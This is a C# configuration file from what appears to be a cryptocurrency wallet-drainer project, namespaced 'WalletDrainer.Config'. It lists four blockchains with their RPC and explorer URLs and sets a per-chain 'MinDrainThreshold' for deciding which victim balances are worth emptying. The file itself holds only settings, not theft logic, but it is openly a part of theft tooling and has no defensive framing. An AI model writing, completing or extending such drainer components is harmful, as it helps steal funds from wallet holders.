namespace WalletDrainer.Config;

public sealed class ChainConfig
{
    private readonly Dictionary<string, ChainDefinition> _chains = new(StringComparer.OrdinalIgnoreCase)
    {
        ["ethereum"] = new ChainDefinition
        {
            ChainId = 1,
            ChainName = "ethereum",
            NativeSymbol = "ETH",
            RpcUrl = "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY",
            ExplorerUrl = "https://etherscan.io",
            MinDrainThreshold = 0.005m
        },
        ["bsc"] = new ChainDefinition
        {
            ChainId = 56,
            ChainName = "bsc",
            NativeSymbol = "BNB",
            RpcUrl = "https://bsc-dataseed.binance.org",
            ExplorerUrl = "https://bscscan.com",
            MinDrainThreshold = 0.01m
        },
        ["polygon"] = new ChainDefinition
        {
            ChainId = 137,
            ChainName = "polygon",
            NativeSymbol = "MATIC",
            RpcUrl = "https://polygon-rpc.com",
            ExplorerUrl = "https://polygonscan.com",
            MinDrainThreshold = 5m
        },
        ["arbitrum"] = new ChainDefinition
        {
            ChainId = 42161,
            ChainName = "arbitrum",
            NativeSymbol = "ETH",
            RpcUrl = "https://arb1.arbitrum.io/rpc",
            ExplorerUrl = "https://arbiscan.io",
            MinDrainThreshold = 0.005m
        }
    };

    public ChainDefinition? GetChain(string name) =>
        _chains.GetValueOrDefault(name);

    public IReadOnlyList<ChainDefinition> GetAllChains() =>
        _chains.Values.ToList();
}

public sealed class ChainDefinition
{
    public required int ChainId { get; init; }
    public required string ChainName { get; init; }
    public required string NativeSymbol { get; init; }
    public required string RpcUrl { get; init; }
    public required string ExplorerUrl { get; init; }
    public required decimal MinDrainThreshold { get; init; }
}
